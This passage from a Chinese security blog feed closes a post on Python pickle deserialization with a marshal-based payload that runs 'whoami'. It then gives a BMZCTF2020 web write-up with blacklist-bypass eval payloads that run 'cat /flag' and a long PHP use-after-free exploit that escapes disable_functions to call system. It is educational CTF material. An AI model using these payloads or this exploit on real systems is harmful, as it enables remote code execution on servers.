class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo()))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103211313.png" alt=""></p><p>在pickle下尝试执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;6QAAAAA=&#x27;   #whomai</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span></span><br><span class="line">data = pickle.loads(payload)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>于是又有一个黑名单绕过执行函数的方式。</p><h2 id="0x04-Others">0x04 Others</h2><p>当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。</p><p><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://misakikata.github.io/2020/04/python-反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python反序列化漏洞&quot;&gt;Python反序列化漏洞&lt;/h1&gt;
&lt;p&gt;这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等
      
    
    </summary>
    
    
      <category term="Web基础安全学习" scheme="http://ca0y1h.top/categories/Web%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="反序列化" scheme="http://ca0y1h.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BMZCTF2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/</id>
    <published>2021-01-03T09:12:56.000Z</published>
    <updated>2021-01-03T09:13:21.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BMZCTF2020-Web-WriteUp">BMZCTF2020 Web WriteUp</h1><h2 id="0x01-easyeval">0x01 easyeval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$cmd=htmlspecialchars($cmd);</span><br><span class="line">$black_list=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>);</span><br><span class="line">$cmd = str_ireplace($black_list,<span class="string">&quot;BMZCTF&quot;</span>,$cmd);</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>拼接绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;t&#39;.&#39;e&#39;.&#39;m&#39;)(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><p><strong>十六进制绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><strong>异或</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(ord(i)^ord(j) == ord(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(tmp1,tmp2)</span><br></pre></td></tr></table></figure><p><strong>取反</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x02-easyphp">0x02 easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下phpinfo的内容，PHP版本7.3，禁掉了很多函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230185957.png" alt=""></p><p>蚁剑的绕过方式都失败了，参考脚本https://xz.aliyun.com/t/8355</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;$a, $p, $i, $x = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt; $x;$j++) &#123;</span><br><span class="line">        $a[$p + $j] = chr($i &amp; <span class="number">0xff</span>);</span><br><span class="line">        $i &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; strlen($s);$x++) &#123;</span><br><span class="line">        $result &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $result |= ord($s[$x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $address - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen($s -&gt; current());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params">$maps</span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    preg_match_all($pattern, $maps, $match);</span><br><span class="line">    <span class="keyword">foreach</span> ($match[<span class="number">1</span>] <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">list</span>($start, $end) = explode(<span class="string">&quot;-&quot;</span>, $value);</span><br><span class="line">        <span class="keyword">if</span> (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= <span class="number">0x200000</span> &amp;&amp; $length &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            $address = <span class="keyword">array</span>(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . $start . <span class="string">&quot; - &quot;</span> . $end . <span class="string">&quot;, length: 0x&quot;</span> . dechex($length) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (leak($a, s2i($_GET[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (s2i($_GET[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    $start = s2i($_GET[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> getElement($a, <span class="keyword">array</span>($start, $start + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; ($address[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);$x++) &#123;</span><br><span class="line">        $addr = <span class="number">0x108</span> + $address[<span class="number">0</span>] + <span class="number">0x1000</span> * $x + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> ($y = <span class="number">0</span>;$y &lt; <span class="number">5</span>;$y++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leak($a, $addr + $y * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((leak($a, $addr + $y * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . dechex($addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> $addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $address = leak($a, $address);</span><br><span class="line">    &#125;<span class="keyword">while</span>(leak($a, $address) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . dechex($address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    $start = $address &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    $lowestAddr = ($address &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span> * <span class="number">0x80</span>; $i++) &#123;</span><br><span class="line">        $addr = $start - $i * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> ($addr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $nameAddr = leak($a, $addr);</span><br><span class="line">        <span class="keyword">if</span> ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $name = dechex(leak($a, $nameAddr));</span><br><span class="line">        $name = str_pad($name, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        $name = strrev(hex2bin($name));</span><br><span class="line">        $name = explode(<span class="string">&quot;\x00&quot;</span>, $name)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>($name === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leak($a, $addr + <span class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $s;</span><br><span class="line">        <span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br><span class="line">        $a = str_shuffle(str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        i2s($a, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        $s -&gt; current();</span><br><span class="line">        $s -&gt; next();</span><br><span class="line">        <span class="keyword">if</span> ($s -&gt; current() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $maps = file_get_contents(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$maps) &#123;</span><br><span class="line">            cantRead($a);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            canRead($maps, $a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params">$elementAddress, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $closure_object = leak($a, $closureChunkAddress + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . dechex($closure_object) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    $closure_handlers = leak($a, $closure_object + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . dechex($closure_handlers) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!($system_address = getSystem($a, $closure_handlers))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . dechex($system_address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);$i++) &#123;</span><br><span class="line">        $data = leak($a, $closure_object + <span class="number">0x08</span> * $i);</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">        i2s($s -&gt; current(), <span class="number">0x08</span> * $i + <span class="number">0x100</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">    i2s($s -&gt; current(), <span class="number">0x20</span>, $system_address);</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object);</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    ($s -&gt; current())(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params">$maps, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$chunkAddress = getPHPChunk($maps)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress = getElement($a, $chunkAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(dechex(bomb1($a)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        $elementAddress = bomb2($a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line">$s -&gt; push(<span class="keyword">new</span> Trigger());</span><br><span class="line">$s -&gt; push(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">$s -&gt; push(<span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; <span class="number">0x100</span>;$x++) &#123;</span><br><span class="line">    $s -&gt; push(<span class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line">$s -&gt; rewind();</span><br><span class="line"><span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>先用蚁剑连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191719.png" alt=""></p><p>再上传至/tmp目录下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191807.png" alt=""></p><p>include包含exp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191837.png" alt=""></p><h2 